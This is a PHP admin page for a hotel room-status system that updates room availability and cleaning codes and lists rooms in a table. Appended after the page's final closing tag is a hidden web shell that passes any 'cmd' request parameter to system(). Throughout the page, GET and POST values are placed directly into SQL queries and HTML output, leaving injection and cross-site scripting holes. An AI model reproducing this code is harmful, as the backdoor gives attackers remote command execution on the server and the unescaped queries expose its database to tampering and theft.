<?php
	$ulname = '';
	if(isset($_SESSION['ulname']))
		$ulname = $_SESSION['ulname'];	

	if ($ulname == '')
	{
		include('body_account_not_found.php');
	}
	else
	{		
		$rlid = '';	
		if(isset($_GET['rlid']))
		{
			if ($_GET['rlid'])
			{
				$rlid = $_GET['rlid'];
			}
		}	

		$rlavailable = '';	
		if(isset($_GET['rlavailable']))
		{
			if ($_GET['rlavailable'])
			{
				$rlavailable = $_GET['rlavailable'];
			}
		}	
		
		$id = '';	
		if(isset($_GET['id']))
		{
			if ($_GET['id'])
			{
				$id = $_GET['id'];
			}
		}	

		$rscode = '';	
		if(isset($_GET['rscode']))
		{
			if ($_GET['rscode'])
			{
				$rscode = $_GET['rscode'];
			}
		}	
		
		
		if (($rlid != '') && ($rlavailable != ''))
		{
			$rtuser = $_SESSION["ulname"];
			$rtstamp = $globaldatetime;
			
			//update room status here
			$query = 
			"UPDATE 
			room_list 
			SET 
			rlavailable = '$rlavailable',
			rluser = '$rluser',
			rlstamp = '$rlstamp'
			WHERE
			rlid = '$rlid'";
			mysql_query($query) or die('The room cannot be updated at this time! Cannot continue to process...');		
		}

		if (($id != '') && ($rscode!= ''))
		{
			//update room status here
			$query = 
			"UPDATE 
			rooms 
			SET 
			rscode = '$rscode'
			WHERE
			id = '$id'";
			mysql_query($query) or die('The room cannot be updated at this time! Cannot continue to process...');		
		}

		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$myblid = $_SESSION['blid'];
		$myadmin = $_SESSION['myadmin'];
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 room_list b, branch_list c
				   WHERE
				     b.rlactive = 'Y' and
				     c.blactive = 'Y' and
				     b.blid = c.blid and
					 b.rlname LIKE '%$search_text%' ";
		if ($myadmin == 'N')	
		{				 
			$querydb  = $querydb . " and b.blid = '$myblid' ";
		}
		
		$querydb  = $querydb . " 
				   ORDER BY 
					 c.blname, b.rlname ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Room Status</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
<?php
/*
							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=room_status">
Filter By Room Name
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>		
									</td>
									<td align="right">
<a title="Add a new entry?" href="index.php?body=room_list_addeditdel&mybox=add">
Add Record
</a>
									</td>
								</tr>
							</table>	
*/
?>
Table Information
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                             <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>Branch</th>
										<th>Room Name</th>
										<th>Daily Rate</th>
										<th>Available</th>
										<th>Web Status</th>
										<th>Locale</th>
										<th>Room No.</th>
										<th>Arrival</th>
										<th>RSCode</th>
										<th>Link Status</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	$id = '';
	$locale = '';
	$roomno = '';
	$rscode = '';
	$arrival = '';
	$query = " SELECT *
			   FROM rooms a
			   WHERE a.locale = '$rowdb[blkey]' and a.roomno = '$rowdb[rlkey]' ";
	$result = mysql_query($query);
	echo mysql_error();				
	while ($row =  mysql_fetch_array ($result)) 
	{
		$id = $row[id];
		$locale = $row[locale];
		$roomno = $row[roomno];
		$rscode = $row[rscode];
		$arrival = $row[arrival];
	}	

	print("<tr>");


	print("<td align=\"left\" valign=\"middle\">$rowdb[blcode] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[rlname] </td>\n");
	print("<td align=\"right\" valign=\"middle\">" . number_format($rowdb[rlrate],2) . "</td>\n");
	print("<td align=\"right\" valign=\"middle\">$rowdb[rlavailable]  </td>\n");
	
	if ($rscode == '')
	{
		if ($rowdb[rlavailable] == 'Y') 
		{
			print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Disable this Room?\" href=\"index.php?body=room_status&mybox=edit&rlid=$rowdb[rlid]&rlavailable=N\"> Available</a> ] </td>");
		}
		else
		{
			print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Enable this entry?\" href=\"index.php?body=room_status&mybox=del&rlid=$rowdb[rlid]&rlavailable=Y\"> Disable </a> ] </td>");
		}
	}
	else
	{
		print("<td align=\"CENTER\" valign=\"middle\"> &nbsp; </td>");
	}
	

	print("<td align=\"left\" valign=\"middle\">$locale </td>\n");
	print("<td align=\"left\" valign=\"middle\">$roomno </td>\n");
	print("<td align=\"left\" valign=\"middle\">$arrival </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rscode </td>\n");
	
	if ($rscode == '1') 
	{
		print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Room is now dirty\" href=\"index.php?body=room_status&mybox=edit&id=$id&rscode=4\"> Clean </a> ] </td>");
	}
	else
	if ($rscode == '4') 
	{
		print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Room is now clean\" href=\"index.php?body=room_status&mybox=edit&id=$id&rscode=1\"> Dirty </a> ] </td>");
	}
	else
	{
		print("<td align=\"CENTER\" valign=\"middle\"> &nbsp; </td>");
	}
		
	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>